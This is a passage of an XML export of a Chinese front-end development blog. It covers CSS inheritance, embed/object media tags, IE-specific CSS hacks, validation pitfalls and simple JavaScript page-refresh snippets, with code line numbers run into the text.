    <title><![CDATA[css中的继承]]></title>
    <url>%2F2015%2F07%2F13%2Fcss%E4%B8%AD%E7%9A%84%E7%BB%A7%E6%89%BF%2F</url>
    <content type="text"><![CDATA[关于css中也有继承的概念，css手册里面都会有介绍。方便阅读，有些朋友他会问起。不可继承的：display、margin、border、padding、background、height、min-height、max-height、width、min-width、max-width、overflow、position、left、right、top、bottom、z-index、float、clear、table-layout、vertical-align、page-break-after、page-bread-before和unicode-bidi。所有元素可继承：visibility和cursor。内联元素可继承：letter-spacing、word-spacing、white-space、line-height、color、font、font-family、font-size、font-style、font-variant、font-weight、text-decoration、text-transform、direction。终端块状元素可继承：text-indent和text-align。列表元素可继承：list-style、list-style-type、list-style-position、list-style-image。表格元素可继承：border-collapse]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css继承</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[加入视频或音乐：embed基本语法]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%8A%A0%E5%85%A5%E8%A7%86%E9%A2%91%E6%88%96%E9%9F%B3%E4%B9%90%EF%BC%9Aembed%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[代码：1&lt;embed src="视频链接地址" width="200" height="45" type=audio/mpeg loop="true" autostart="false"&gt;代码说明：&emsp;&emsp;播放器宽度width和高度herght可以灵活设置,如果都设为0，那么音乐就成了背景音乐，没有播放器.autostart=”true”为自动播放,autostart=”false”为不自动播放.loop=”true”为连续循环播放,loop=”false”为不循环播放.loop可以等于一个整数,比如loop=”2”,就是音乐循环播放2次。如下为embed基本语法：embed（一）、基本语法：embed src=url说明：embed可以用来插入各种多媒体，格式可以是 Midi、Wav、AIFF、AU、MP3等等，Netscape及新版的IE 都支持。url为音频或视频文件及其路径，可以是相对路径或绝对路径。示例：1&lt;embed src="your.mid"&gt;（二）、属性设置：1、自动播放：语法：autostart=true、false说明：该属性规定音频或视频文件是否在下载完之后就自动播放。true：音乐文件在下载完之后自动播放；false：音乐文件在下载完之后不自动播放。示例：12&lt;embed src="your.mid" autostart=true&gt;&lt;embed src="your.mid" autostart=false&gt;2、循环播放：语法：loop=正整数、true、false说明：该属性规定音频或视频文件是否循环及循环次数。属性值为正整数值时，音频或视频文件的循环次数与正整数值相同；属性值为true时，音频或视频文件循环；属性值为false时，音频或视频文件不循环。示例：123&lt;embed src="your.mid" autostart=true loop=2&gt;&lt;embed src="your.mid" autostart=true loop=true&gt;&lt;embed src="your.mid" autostart=true loop=false&gt;3、面板显示：语法：hidden=ture、no说明：该属性规定控制面板是否显示，默认值为no。ture：隐藏面板；no：显示面板。示例：12&lt;embed src="your.mid" hidden=ture&gt;&lt;embed src="your.mid" hidden=no&gt;4、开始时间：语法：starttime=mm:ss（分：秒）说明：该属性规定音频或视频文件开始播放的时间。未定义则从文件开头播放。示例：1&lt;embed src="your.mid" starttime="00:10"&gt;5、音量大小：语法：volume=0-100之间的整数说明：该属性规定音频或视频文件的音量大小。未定义则使用系统本身的设定。示例：1&lt;embed src="your.mid" volume="10"&gt;6、容器属性：语法：height=# width=#说明：取值为正整数或百分数，单位为像素。该属性规定控制面板的高度和宽度。height：控制面板的高度；width：控制面板的宽度。示例：1&lt;embed src="your.mid" height=200 width=200&gt;7、容器单位：语法：units=pixels、en说明：该属性指定高和宽的单位为pixels或en。示例：12&lt;embed src="your.mid" units="pixels" height=200 width=200&gt;&lt;embed src="your.mid" units="en" height=200 width=200&gt;8、外观设置：语法：controls=console、smallconsole、playbutton、pausebutton、stopbutton、volumelever说明：该属性规定控制面板的外观。默认值是console。console：一般正常面板；smallconsole：较小的面板；playbutton：只显示播放按钮；pausebutton：只显示暂停按钮；stopbutton：只显示停止按钮；volumelever：只显示音量调节按钮。示例：12&lt;embed src="your.mid" controls=smallconsole&gt;&lt;embed src="your.mid" controls=volumelever&gt;9、对象名称：语法：name=#说明：#为对象的名称。该属性给对象取名，以便其他对象利用。示例：1&lt;embed src="your.mid" name="sound1"&gt;10、说明文字：语法：title=#说明：#为说明的文字。该属性规定音频或视频文件的说明文字。示例：1&lt;embed src="your.mid" title="第一首歌"&gt;11、前景色和背景色：语法：palette=color|color说明：该属性表示嵌入的音频或视频文件的前景色和背景色，第一个值为前景色，第二个值为背景色，中间用 | 隔开。color可以是RGB色（RRGGBB）也可以是颜色名，还可以是transparent（透明）。示例：1&lt;embed src="your.mid" palette="red|black"&gt;12、对齐方式：语法：align=top、bottom、center、baseline、 left、right、texttop、middle、absmiddle、absbottom说明：该属性规定控制面板和当前行中的对象的对齐方式。center：控制面板居中；left：控制面板居左；right：控制面板居右；top：控制面板的顶部与当前行中的最高对象的顶部对齐；bottom：控制面板的底部与当前行中的对象的基线对齐；baseline：控制面板的底部与文本的基线对齐；texttop：控制面板的顶部与当前行中的最高的文字顶部对齐；middle：控制面板的中间与当前行的基线对齐；absmiddle：控制面板的中间与当前文本或对象的中间对齐；absbottom：控制面板的底部与文字的底部对齐。示例：12&lt;embed src="your.mid" align=top&gt;&lt;embed src="your.mid" align=center&gt;使用 object 和 embed 标记&emsp;&emsp;要在 Web 浏览器中显示 Flash SWF 文件，HTML 文档必须使用具有正确参数的 object 和 embed 标记。对于 object，其中的四个设置（height、width、classid 和 codebase）是出现在 object 标记内的属性；所有其他设置都是出现在单独的名为 param 标记内的参数。例如：12345678&lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="100"height="100" codebase="[&lt;span style="color: #0066cc;"&gt;[url]http://active.macromedia.com/flash7/cabs/&lt;/span&gt;](http://active.macromedia.com/flash7/cabs/)[/url]swflash.cab#version=7,0,0,0"&gt;&lt;param name="movie" value="moviename.swf"&gt;&lt;param name="play" value="true"&gt;&lt;param name="loop" value="true"&gt;&lt;param name="quality" value="high"&gt;&lt;/object&gt;&emsp;&emsp;对于 embed 标记，所有设置（如 height、width、quality 和 loop）都是出现在开始 embed 标记的两个尖括号之间的属性。例如：1234&lt;embed src="moviename.swf" width="100" height="100" play="true"loop="true" quality="high"pluginspage="[&lt;span style="color: #0066cc;"&gt;[url]http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash&lt;/span&gt;](http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash)[/url]"&gt;&lt;/embed&gt;&emsp;&emsp;若要一起使用这两种标记，请将 embed 标记正好放在结束 object 标记的前面，如下所示：123456789101112&lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="100"height="100" codebase="[&lt;span style="color: #0066cc;"&gt;[url]http://active.macromedia.com/flash7/cabs/&lt;/span&gt;](http://active.macromedia.com/flash7/cabs/)[/url]swflash.cab#version=6,0,0,0"&gt;&lt;param name="movie" value="moviename.swf"&gt;&lt;param name="play" value="true"&gt;&lt;param name="loop" value="true"&gt;&lt;param name="quality" value="high"&gt;&lt;embed src="moviename.swf" width="100" height="100" play="true?loop="true" quality="high"pluginspage="[&lt;span style="color: #0066cc;"&gt;[url]http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash&lt;/span&gt;](http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash)[/url]"&gt;&lt;/embed&gt;&lt;/object&gt;&emsp;&emsp;注意：如果既使用 object 标记也使用 embed 标记，则对每个属性或参数都要使用相同的值以确保能在各种浏览器上进行一致的回放。参数 swflash.cab#version=6,0,0,0 是可选参数，如果您不想检查版本号，则可以省略此参数。src=歌曲（音乐地址）换成一个aaa.mp3文件，用记事本打开，再新建一个aaa.mp3文件，里面放每一首歌的地址，如：123[&lt;span style="color: #0066cc;"&gt;http://****.mp3&lt;/span&gt;](http://%2A%2A%2A%2A.mp3/)[&lt;span style="color: #0066cc;"&gt;http://****.mp3&lt;/span&gt;](http://%2A%2A%2A%2A.mp3/)[&lt;span style="color: #0066cc;"&gt;http://****.mp3&lt;/span&gt;](http://%2A%2A%2A%2A.mp3/)]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>embed</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何让iframe有透明效果]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%A6%82%E4%BD%95%E8%AE%A9iframe%E6%9C%89%E9%80%8F%E6%98%8E%E6%95%88%E6%9E%9C%2F</url>
    <content type="text"><![CDATA[让IFrame透明效果,里加一个allowTransparency=”true”就行了.比如:1&lt;iframe width="100%" align="center" id="test" name="test" frameborder="0" scrolling="no" src="2.html" allowTransparency="true" &gt;&lt;/iframe&gt;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>iframe透明</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS中expression怎么用？ CSS expression详解]]></title>
    <url>%2F2015%2F07%2F13%2Fcss%E4%B8%ADexpression%E6%80%8E%E4%B9%88%E7%94%A8%EF%BC%9F-css-expression%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[什么是CSS expression？IE5及其以后版本支持在CSS中使用expression，用来把CSS属性和Javascript脚本关联起来，这里的CSS属性可以是元素固有的属性，也可以是自定义属性。就是说CSS属性后面可以是一段Javascript表达式，CSS属性的值等于Javascript表达式计算的结果。 在表达式中可以直接引用元素自身的属性和方法，也可以使用其他浏览器对象。这个表达式就好像是在这个元素的一个成员函数中一样。 是不是感觉上面的文字有点晦涩？没有关系，你只需要知道：我们可以通过expression把Javascript脚本写放在css文件中，通过它来实现一些很方便的功能与效果。1、给元素固有属性赋值下面的实例是依照浏览器的大小来安置一个元素的位置。查看运行效果试试。12345678910111213141516171819202122232425&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "[&lt;span style="color: #0066cc;"&gt;[url]http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&lt;/span&gt;](http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd)[/url]"&gt;&lt;html xmlns="[&lt;span style="color: #0066cc;"&gt;[url]http://www.w3.org/1999/xhtml&lt;/span&gt;](http://www.w3.org/1999/xhtml)[/url]"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;title&gt;[www.52css.com&lt;/title&gt;](http://www.52css.com%3C/title%3E)&lt;style type="text/css"&gt;&lt;!--#myDiv &#123;position: absolute;width: 100px;height: 100px;background:#c00;left: expression(document.body.offsetWidth - 180 + "px");top: expression(document.body.offsetHeight - -80 + "px");text-align:center;line-height:90px;color:#fff;&#125;--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="myDiv"&gt;52css.com&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;2、给元素自定义属性赋值我们想给页面的链接消除点击时产生的虚线。在一般情况下，我们是这样做的：123&lt;a href="link1.htm"&gt;52css.com&lt;/a&gt;&lt;br /&gt;&lt;a href="link2.htm"&gt;52css.com&lt;/a&gt;&lt;br /&gt;&lt;a href="link3.htm"&gt;52css.com&lt;/a&gt;采用expression的做法如下：a {star:expression=\’#\’”}我们看下面的例子：123456789101112131415&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "[&lt;span style="color: #0066cc;"&gt;[url]http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&lt;/span&gt;](http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd)[/url]"&gt;&lt;html xmlns="[&lt;span style="color: #0066cc;"&gt;[url]http://www.w3.org/1999/xhtml&lt;/span&gt;](http://www.w3.org/1999/xhtml)[/url]"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;title&gt;[www.npm8.com](http://www.npm8.com)&lt;/title&gt;&lt;style type="text/css"&gt;&lt;!--a &#123;star:expression=\'#\'" /&gt;--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;a href="#"&gt;grycheng- [&lt;span style="color: #0066cc;"&gt;www.npm8.com&lt;/span&gt;](http://www.npm8.com)&lt;span style="color: #000000;"&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;说明：里面的star就是自己任意定义的属性，你可以随自己喜好另外定义，接着包含在expression()里的语句就是JS脚本，在自定义属性与expression之间可别忘了还有一个引号，因为实质还是CSS，所以放在style标签内，而非script内。这样就很容易地用一句话实现了页面中的链接虚线框的消除。需要引起你特别重视的：若不是非常特别的需要用到expression，一般不建议使用expression，因为expression对浏览器资源要求比较高。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>expression</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Div+CSS网页布局中CSS无效的十个常见原因]]></title>
    <url>%2F2015%2F07%2F13%2Fdivcss%E7%BD%91%E9%A1%B5%E5%B8%83%E5%B1%80%E4%B8%ADcss%E6%97%A0%E6%95%88%E7%9A%84%E5%8D%81%E4%B8%AA%E5%B8%B8%E8%A7%81%E5%8E%9F%E5%9B%A0%2F</url>
    <content type="text"><![CDATA[我们从很多地方学习Div+CSS网页布局的知识，可是W3C validation有时难以操作，但用它你可以查看由版面设计引起的差错。验证程序抛出大量差错和警告，说明你的XHTML尚未完善，可能无法在不同浏览器上保持一致功能。下面十个细微的失效问题难住了大批程序员，本文就告诉你如何解决。在本文开始前介绍一些使用W3C验证程序时需要注意的问题。1、不要担心验证程序的警告：如果验证程序说发现12处错误以及83处警告，不要理它，继续进行下一步。2、一次更正一个错误：按顺序进展工作，从上到下，一次修正一个错误。HTML用浏览器从上到下浏览，这些错误也是按同样顺序显示。3、每次修正代码后要刷新代码，使它们重新生效：一个小错误常常会引发之后整页的连串错误。因此如果操作不当，“修正错误”也可能引发更多错误。每次修正后使代码重新生效，这样就可以确保完全解决问题。知道了上面这些基本的异常情况，下面我们就来看看版面设计无效的几个原因。一、div 标签未关闭这是版面设计失效的最常见原因之一。当我们了解到这是多少精致的版块设计失效的罪魁祸首时，总会大吃一惊。开启的div标签是最普遍的版块设计失误之一，也是最难诊断的失误之一。验证程序有时会指向错误的开启div标签，诊断时就像大海捞针一样麻烦。二、麻烦的embed标签九十年代早期，Microsoft和Netscape的浏览器开始能够辨认非标准的独有字体。遗憾的是这意味着W3C验证程序还不能识别某些关键HTML 标签，如“embed”，即使这些标签已经被广泛使用。如果确实希望得到严格的DOCTYPE(文档类型)验证，就只能放弃嵌套。如果同时想要生效的版面设计和嵌入式媒体，可以试试Flash Satay方法。三、不当的DOCTYPE声明不声明DOCTYPE，或者在文件开始错误声明DOCTYPE，也是一个常见错误。根据一般经验，Strict DOCTYPE是大家追求的最高级验证。Strict validation表明你的网页能够在所有浏览器上都得到最佳展示。关于DTD文档类型的声明，您可以参考52CSS.com的相关文章。四、结尾斜线如果你的网站不能验证，很有可能是在代码的某个地方漏写了结尾斜线。我们很容易忽略结尾斜线之类的东西，特别是在image标签等元素中。在严格的DOCTYPE中这是无效的。要在img标签结尾处加上“/”以解决此问题。五、Align标签如果DOCTYPE被设为Transitional，你就会使用“align”标签，但如果要求更高一点希望得到Strict验证，你会看到很多错误。 Align是另一个不可用于版面设计的标签。可以尝试用“float”或者“text-align”来代替align转换元素。六、JavaScript如果已经声明Strict DOCTYPE，就需要在JavaScript中覆盖CDATA标签。验证程序的这一方面难倒了很多程序员，因为网站倾向于为广告和追踪脚本使用嵌入的 JavaScript。如果必须用到JavaScript，可以在其前后加上如下标签：七、图像需要“alt”属性你可能还没有注意到，图像也是高级验证的潜在绊脚石。除了结尾斜线，高级验证也要求用alt标签来描述图像，如alt= ”Scary vampire picture”。搜索引擎也靠alt标签来识别网页上的图像，所以无论怎样加上alt标签总是好的。八、未知实体数据实体数据是又一个影响验证的易犯错误。我们可以考虑用适当的编码字符来代替“&amp;”等符号。entire list中列出在XHTML版块设计中可用的适当的编码字符实体数据。九、不良嵌套嵌套就是元素里又包括元素，我们容易混淆嵌套元素的顺序。例如在div标签前启动strong标签，但又先关闭div标签。这可能不会改变版块布局，但却会使你的版块设计失效。十、缺少“title”标签尽管这看上去是一个很明显的错误，很多程序员(包括我自己)还是经常会在“head”版块中遗漏title标签。当你看到“missing a required sub-element of HEAD”(缺少HEAD的必要子元素)时，才会发现自己忘记添加title标签了。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>网页布局</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于scrollbar-face-color只支持ie的解决方法]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%85%B3%E4%BA%8Escrollbar-face-color%E5%8F%AA%E6%94%AF%E6%8C%81ie%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[IE浏览器中自定义滚动条样式：12345678910HTML&#123;scrollbar-base-color: #C0C0C0;scrollbar-base-color: #C0C0C0;scrollbar-3dlight-color: #C0C0C0;scrollbar-highlight-color: #C0C0C0;scrollbar-track-color: #EBEBEB;scrollbar-arrow-color: black;scrollbar-shadow-color: #C0C0C0;scrollbar-dark-shadow-color: #C0C0C0;&#125;解释：介绍一下涉及浏览器滚动条的样式表内容（某些样式需ie5.5+才能支持）：1．overflow内容溢出时的设置（设定被设定对象是否显示滚动条）overflow-x水平方向内容溢出时的设置overflow-y垂直方向内容溢出时的设置以上三个属性设置的值为visible(默认值)、scroll、hidden、auto。2．scrollbar-3d-light-color立体滚动条亮边的颜色（设置滚动条的颜色）scrollbar-arrow-color上下按钮上三角箭头的颜色scrollbar-base-color滚动条的基本颜色scrollbar-dark-shadow-color立体滚动条强阴影的颜色scrollbar-face-color立体滚动条凸出部分的颜色scrollbar-highlight-color滚动条空白部分的颜色scrollbar-shadow-color立体滚动条阴影的颜色CHROME浏览器中自定义滚动条样式：123::-webkit-scrollbar &#123; width: 3px; height: 3px;&#125;::-webkit-scrollbar-track-piece &#123; background-color: #ffffff;&#125;::-webkit-scrollbar-thumb&#123;height: 50px; background-color: #666; -webkit-border-radius: 3px;&#125;解释：::-webkit-scrollbar 滚动条宽跟高::-webkit-scrollbar-track-piece 滚动条样式底部内层样式::-webkit-scrollbar-thumb 滚动条滑块样式-webkit-border-radius: 滚动条滑块边角–导圆角FireFox下自定义滚动条：1234567891011121314151617181920212223242526@-moz-document url-prefix(http://),url-prefix(https://) &#123;/* 滚动条颜色 */scrollbar &#123;-moz-appearance: none !important;background: rgb(0,255,0) !important;&#125;/* 滚动条按钮颜色 */thumb,scrollbarbutton &#123;-moz-appearance: none !important;background-color: rgb(0,0,255) !important;&#125;/* 鼠标悬停时按钮颜色 */thumb:hover,scrollbarbutton:hover &#123;-moz-appearance: none !important;background-color: rgb(255,0,0) !important;&#125;/* 隐藏上下箭头 */scrollbarbutton &#123;display: none !important;&#125;/* 纵向滚动条宽度 */scrollbar[orient="vertical"] &#123;min-width: 15px !important;&#125;&#125;FF下用JS实现自定义滚动条：JS123456789101112&lt; script type=“text/javascript” src=“JQUERY-1.1.3.1.js”&gt;&lt;/script&gt;&lt; script type=“text/javascript” src=“jquery.linscroll.js“&gt;&lt;/script&gt;&lt; script type=“text/javascript”&gt;$(document).ready(function()&#123;$(’#scrollContent’).setScroll( //scrollContent为滚动层的ID&#123;img:scroll_bk.gif’,width:10&#125;,//背景图及其宽度&#123;img:scroll_arrow_up.gif’,height:3&#125;,//up image&#123;img:scroll_arrow_down.gif’,height:3&#125;,//down image&#123;img:scroll_bar.gif’,height:25&#125;//bar image);&#125;);&lt; /script&gt;HTML1&lt; div id=“scrollContent” style=“width:140px;overflow:hidden;height:170px;”&gt;内容&lt;/div&gt;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>scrollbar-face-color</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE6不支持min-height、max-height的解决办法]]></title>
    <url>%2F2015%2F07%2F13%2Fie6%E4%B8%8D%E6%94%AF%E6%8C%81min-height%E3%80%81max-height%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[第一种解决方法：我们可以利用IE6不识别!important来实现：123height:auto!important;height:500px;min-height:500px;这3句代码就让IE6也有了高度min-height的效果，大家可以把下面的代码复制保存成网页文件看看效果。12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=gb2312" /&gt;&lt;title&gt;残缺 完美 生活&lt;/title&gt;&lt;/head&gt;&lt;style type="text/css"&gt;* &#123;margin:0;padding:0;&#125;body &#123;font-family:Arial, Helvetica, 宋体, sans-serif;font-size:12px;text-align:center;background-color:#D4D5CC;&#125;#wrapper &#123;height:auto!important;height:500px;min-height:500px;width:760px;background-color:#e5e5e5;border:1px solid #fff;text-align:left;line-height:150%;padding:20px;margin:10px auto;&#125;&lt;/style&gt;&lt;body&gt;&lt;div id="wrapper"&gt; The Furthest Distance In The World &lt;br /&gt;世界上最遥远的距离 &lt;br /&gt;Tagore泰戈尔 &lt;br /&gt;The furthest distance in the world &lt;br /&gt;世界上最遥远的距离 &lt;br /&gt;Is not between life and death &lt;br /&gt;不是生与死 &lt;br /&gt;But when I stand in front of you &lt;br /&gt;而是 我就站在你面前 &lt;br /&gt;Yet you don't know that I love you &lt;br /&gt;你却不知道我爱你 &lt;br /&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;第二种解决方法：在IE6IE5IE7FF测试竟然正常，而且能通过W3C检测的,方法如下:HTML代码#test { min-height:100px; background:#BBB; _height:100px; overflow: visible; }说明一下上面这段CSS的意思。min-height:100px;这一句在ie7和FF已经可以正常显示了。。_height:100px这一句在ie6，ie5测试显示正常。但不能过W3C验证:overflow:visible;这一句为了注明#test当内容超过100px时就自动延长。注意：你必须保证#test以外的都要是overflow:visible。否则还是不会显示超出。第三种解决方法：IE6有许多bug，之一是不支持min-这个属性。是做UI设计时，全屏展示，但是当窗口不在最大化时，缩小到一定大小，图片会严重错位，影响页面排版，这时要设置一个最小宽度，其他浏览器都支持min-width这个属性，未读IE6不支持，以下是第三种解决方案。1、IE6支持max-height解决方法1.yangshi&#123;max-height:1000px;_height:expression((document.documentElement.clientHeight||document.body.clientHeight)&lt;1000?"1000px":"");overflow:hidden;&#125;2、IE6支持min-height解决方法1.yangshi&#123;min-height:1000px;_height:expression((document.documentElement.clientHeight||document.body.clientHeight)&gt;1000?"1000px":"");&#125;3、IE6支持max-height又支持min-height方法1.yangshi&#123;Max-Height:620px;Min-Height:40px;_height:expression(this.scrollHeight &gt; 620 ? "620px" : (this.scrollHeight &lt; 40 ? "40px" : "auto"));&#125;上面是最简单的方式，可能会增加服务器的负担，网上还有其他方式，可查阅借鉴一下。]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>ie6</tag>
        <tag>max-height</tag>
        <tag>min-height</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE浏览器下去掉链接等的虚边框]]></title>
    <url>%2F2015%2F07%2F13%2Fie%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8B%E5%8E%BB%E6%8E%89%E9%93%BE%E6%8E%A5%E7%AD%89%E7%9A%84%E8%99%9A%E8%BE%B9%E6%A1%86%2F</url>
    <content type="text"><![CDATA[浏览器兼容性bug：在ff下,a链接没有虚边框,而在ie浏览器里当我们的鼠标点击链接的时候却发现a链接有虚边框，后来我试了下a:visited{border:1px solid red}都不行,当我点击链接的时候,a链接还是有虚线边框,后来发现这样可以：12345a&#123;border:1px solid red;*blr:expression(this.onFocus=this.blur());outline:none;&#125;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>ie虚边框</tag>
        <tag>ie链接</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详解行间距（line-height）计算的背后的真相]]></title>
    <url>%2F2015%2F07%2F13%2F%E8%AF%A6%E8%A7%A3%E8%A1%8C%E9%97%B4%E8%B7%9D%EF%BC%88line-height%EF%BC%89%E8%AE%A1%E7%AE%97%E7%9A%84%E8%83%8C%E5%90%8E%E7%9A%84%E7%9C%9F%E7%9B%B8%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;众所周知的一个垂直居中实现方式(其他的暂不讨论)..&emsp;&emsp;高度给定的元素, 其内部单行文本垂直居中的一种实现方式为: 给当前定高元素, 设置line-height属性, 其属性值等于当前元素的height值.&emsp;&emsp;今天了解到了一条相关知识, 明白这个方法的实现原理.我们常说的单倍行距, 双倍行距等等, 主观上认为是line-height设置的值, 如果量一下实际的效果, 会发现, 两行文本的间距, 并非等于line-height的值.浏览器计算和分配行间距的方法间距 = “line-height” – “font-size”;文本上下分配大小 = 间距/2;字号 = 12px; line-height:3;间距 = 3*12 – 12 = 24(px);文本上下分配大小 = 24/2 = 12(px)逻辑上如此无懈可击~ o.0小知识点(个人认为, 应该这样)**&emsp;&emsp;line-height的值, 推荐使用数字而非带有单位的值, 如, 推荐使用line-height:2; 不推荐使用line-height:24px;原因在于, line-height:24px;是一个固定的值, 对于任何大小的文本, 都采用这个值来计算行间距. 若文本的字号过大, 会出现重叠的问题. 不带单位的值表示倍数. 自然避免了该问题.看下边的例子123456789101112131415161718192021222324252627282930313233&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8" /&gt;&lt;style type="text/css"&gt;div &#123;font-size: 30px;font-family: Consolas, Microsoft Yahei, SimSun;margin: 10px 10px 0px 10px;padding: 10px;&#125;#demo_1 &#123;background: #EEE;border: solid 1px #CCC;line-height: 12px;&#125;#demo_2 &#123;background: #333;border: solid 1px #000;line-height: 2;color: #FFF;&#125;&lt;/style&gt;&lt;title&gt;Line-heighg demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="demo_1"&gt; line-height:24px;line-height:24px; &lt;/div&gt;&lt;div id="demo_2"&gt; line-height:2;line-height:2; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>line-height</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS关于细节的大美集]]></title>
    <url>%2F2015%2F07%2F13%2Fcss%E5%85%B3%E4%BA%8E%E7%BB%86%E8%8A%82%E7%9A%84%E5%A4%A7%E7%BE%8E%E9%9B%86%2F</url>
    <content type="text"><![CDATA[细节1一、当文字与图片在一行，需要将文字与图片底对齐，需要这样写：src="" align="bottom" style="margin-bottom:-4px"/>```1234**二、当文字与图片在一行，需要将文字与图片居中对齐，需要这样写：**```&lt;li&gt;记住密码&lt;img src=&quot;static/img/xyx.jpg&quot; align=&quot;middle&quot;/&gt;&lt;/li&gt;三、更改IE“查看源代码”菜单打开的编辑器打开注册表编辑器,在开始-运行中输入regedit找到以下位置： HKEY_LOCAL_MACHINE”SOFTWARE”Microsoft”Internet Explorer”View SourceEditor”EditorName”修改默认的数据为”D:” ProgramFiles”EmEditor”EmEditor.exe”切换到IE中查看源代码就可以看到效果了。如果View Source Editor”Editor Name项没有,可以自己新建。四、自动最大化窗口，在 &lt;body&gt; 与 &lt;/body&gt; 之间加入：1234&lt;SCRIPT language="javascript"&gt;setTimeout('top.moveTo(0,0)',5000);setTimeout('top.resizeTo(screen.availWidth,screen.availHeight)',5000);&lt; /script&gt;五、window.opener 实际上就是用window.open打开的窗体的父窗体。比如在父窗体parentForm里面 通过 window.open(“subForm.html”),那么在subform.html中 window.opener就代表parentForm,可以通过这种方式设置父窗体的值或者调用js方法。1,window.opener.test(); —调用父窗体中的test()方法；2,如果window.opener存在,设置parentForm中stockBox的值。1234567if (window.opener &amp;amp;&amp;amp; !window.opener.closed)&#123;window.opener.document.parentForm.stockBox.value = symbol;&#125;六、刷新页面的方法Javascript刷新页面的方法：1 history.go(0)2 location.reload()3 location=location4 location.assign(location)5 document.execCommand(‘Refresh’)6 window.navigate(location)7 location.replace(location)8 document.URL=location.href自动刷新页面的方法:1.页面自动刷新：把http-equiv="refresh" content="20">```加入``````区域中1234567891011122.页面自动跳转：把```&lt;meta http-equiv=&quot;refresh&quot; content=&quot;20;url=http://www.wyxg.com&quot;&gt;```加入```&lt;head&gt;```区域中3.js自动刷新页面```javascript&lt;script language=&quot;JavaScript&quot;&gt;function myrefresh()&#123;window.location.reload();&#125;setTimeout(&apos;myrefresh()&apos;,1000); //指定1秒刷新一次&lt; /script&gt;4.JS刷新框架a)刷新包含该框架的页面用123&lt;script language=JavaScript&gt;parent.location.reload();&lt; /script&gt;b)子窗口刷新父窗口123&lt;script language=JavaScript&gt;self.opener.location.reload();&lt; /script&gt;( 或href="javascript:opener.location.reload()">刷新```)123456c)刷新另一个框架的页面```javascript&lt;script language=JavaScript&gt;parent.另一FrameID.location.reload();&lt; /script&gt;七、用过CSS hack应该知道，用下划线命名是一种hack，如使用“style”这样的命名，可以让IE外的大部分浏览器忽略这个样式的定义，所以使用“”做为命名时的分隔符是不规范的。在做CSS检查时会出现错误提示。八、IE条件注释写法123&lt; !--[if !IE]&gt;除IE外都可识别&lt;![endif]--&gt;&lt; !--[if IE]&gt; 所有的IE可识别 &lt;![endif]--&gt;&lt; !--[if IE 5.0]&gt; 只有IE5.0可以识别 &lt;![endif]--&gt;九、CSS HACK 写法第一种：12345.div &#123;background:orange;*background:green !important;*background:blue;&#125;第二种：12345.div &#123;margin:10px;*margin:15px;_margin:15px;&#125;第三种：123#div &#123; color: 